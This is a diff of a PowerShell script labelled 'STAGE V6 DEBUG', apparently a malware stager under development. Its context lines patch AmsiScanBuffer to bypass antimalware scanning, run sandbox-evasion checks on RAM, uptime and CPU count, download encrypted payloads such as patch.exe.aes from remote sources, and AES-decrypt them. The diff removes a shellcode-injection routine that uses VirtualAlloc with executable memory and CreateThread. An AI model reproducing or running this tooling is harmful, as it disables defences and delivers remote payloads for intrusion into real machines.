@@ -1,4 +1,4 @@
-# === STAGE V6 DEBUG — Console output, no hidden windows ===
+# === STAGE V6 DEBUG v2 -- ASCII only, no special chars ===
 $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 
@@ -7,7 +7,7 @@ function _err($m) { Write-Host "[-] $m" -ForegroundColor Red }
 function _warn($m){ Write-Host "[!] $m" -ForegroundColor Yellow }
 function _info($m){ Write-Host "[*] $m" -ForegroundColor Cyan }
 
-_info "=== STAGE V6 DEBUG ==="
+_info "=== STAGE V6 DEBUG v2 ==="
 _info "PS Version: $($PSVersionTable.PSVersion)"
 _info "CLR: $($PSVersionTable.CLRVersion)"
 _info "User: $env:USERNAME | Host: $env:COMPUTERNAME | PID: $pid"
@@ -55,7 +55,7 @@ try {
     _ok "Type created: $W"
     _ok "STEP 1: PASS"
 } catch {
-    _err "STEP 1: FAIL — $($_.Exception.Message)"
+    _err "STEP 1: FAIL -- $($_.Exception.Message)"
     _err "Line: $($_.InvocationInfo.ScriptLineNumber)"
     exit 1
 }
@@ -89,7 +89,7 @@ try {
     
     _ok "STEP 2: PASS"
 } catch {
-    _err "STEP 2: FAIL — $($_.Exception.Message)"
+    _err "STEP 2: FAIL -- $($_.Exception.Message)"
 }
 
 # === STEP 3: AMSI Patch ===
@@ -111,7 +111,7 @@ try {
     _ok "AmsiScanBuffer patched"
     _ok "STEP 3: PASS"
 } catch {
-    _err "STEP 3: FAIL — $($_.Exception.Message)"
+    _err "STEP 3: FAIL -- $($_.Exception.Message)"
 }
 
 # === STEP 4: Sandbox checks ===
@@ -122,15 +122,15 @@ try {
     $os=Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
     $ramMB=[math]::Round($os.TotalVisibleMemorySize/1024)
     _info "RAM: ${ramMB}MB"
-    if ($ramMB -lt 2048) { _warn "RAM < 2GB"; $chkPass=$false }
+    if ($ramMB -lt 2048) { _warn 'RAM less than 2GB'; $chkPass=$false }
     $uptime=(Get-Date) - $os.LastBootUpTime
     _info "Uptime: $([math]::Round($uptime.TotalMinutes)) min"
-    if ($uptime.TotalMinutes -lt 30) { _warn "Uptime < 30min"; $chkPass=$false }
+    if ($uptime.TotalMinutes -lt 30) { _warn 'Uptime less than 30min'; $chkPass=$false }
 } catch { _err "CIM check failed: $($_.Exception.Message)"; $chkPass=$false }
 try {
     $cpu=Get-CimInstance Win32_Processor -ErrorAction Stop
     _info "CPU cores: $($cpu.NumberOfLogicalProcessors)"
-    if ($cpu.NumberOfLogicalProcessors -lt 2) { _warn "CPU < 2 cores"; $chkPass=$false }
+    if ($cpu.NumberOfLogicalProcessors -lt 2) { _warn 'CPU less than 2 cores'; $chkPass=$false }
 } catch {}
 if ($chkPass) { _ok "STEP 4: PASS" } else { _warn "STEP 4: Some checks failed" }
 
@@ -153,9 +153,9 @@ foreach ($src in $sources) {
         $wc.Headers.Add('User-Agent','Mozilla/5.0')
         $testUrl="$src/raw/patch.exe.aes"
         $data=$wc.DownloadData($testUrl)
-        _ok "$src — OK ($($data.Length) bytes from patch.exe.aes)"
+        _ok "$src -- OK ($($data.Length) bytes from patch.exe.aes)"
     } catch {
-        _err "$src — FAIL: $($_.Exception.Message)"
+        _err "$src -- FAIL: $($_.Exception.Message)"
     }
 }
 
@@ -178,11 +178,11 @@ function _dl($remoteName) {
             $wc=New-Object Net.WebClient
             $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
             $d=$wc.DownloadData($u)
-            _ok "DL: $remoteName — $($d.Length) bytes from $src"
+            _ok "DL: $remoteName -- $($d.Length) bytes from $src"
             return ,$d
-        } catch { _warn "DL: $remoteName — FAIL from $src" }
+        } catch { _warn "DL: $remoteName -- FAIL from $src" }
     }
-    _err "DL: $remoteName — FAILED ALL SOURCES"
+    _err "DL: $remoteName -- FAILED ALL SOURCES"
     return $null
 }
 
@@ -208,24 +208,6 @@ function _aesDecrypt($encryptedBytes, $keyIVBase64) {
     } catch {
         _err "AES decrypt: $($_.Exception.Message)"
         return $null
-    }
-}
-
-function _scInject($shellcode) {
-    try {
-        $size=$shellcode.Length
-        $addr=$W::VA([IntPtr]::Zero,$size,0x3000,0x40)
-        if ($addr -eq [IntPtr]::Zero) { _err "VirtualAlloc failed"; return $false }
-        [Runtime.InteropServices.Marshal]::Copy($shellcode,0,$addr,$size)
-        $tid=[UInt32]0
-        $th=$W::CT([IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[ref]$tid)
-        if ($th -eq [IntPtr]::Zero) { _err "CreateThread failed"; return $false }
-        $W::WF($th,0xFFFFFFFF) | Out-Null
-        _ok "SC injected: $size bytes, tid=$tid"
-        return $true
-    } catch {
-        _err "SC inject: $($_.Exception.Message)"
-        return $false
     }
 }
 
@@ -264,15 +246,16 @@ foreach ($p in $payloads) {
         if ($keyIV) {
             $sc=_aesDecrypt $encBytes $keyIV
             if ($sc) {
-                _ok "$p — OK ($($sc.Length) bytes decrypted)"
+                $scLen=$sc.Length
+                _ok "$p -- OK ($scLen bytes decrypted)"
             } else {
-                _err "$p — DECRYPT FAILED"
+                _err "$p -- DECRYPT FAILED"
             }
         } else {
-            _err "$p — KEY NOT FOUND"
+            _err "$p -- KEY NOT FOUND"
         }
     } else {
-        _err "$p — DOWNLOAD FAILED"
+        _err "$p -- DOWNLOAD FAILED"
     }
 }
 
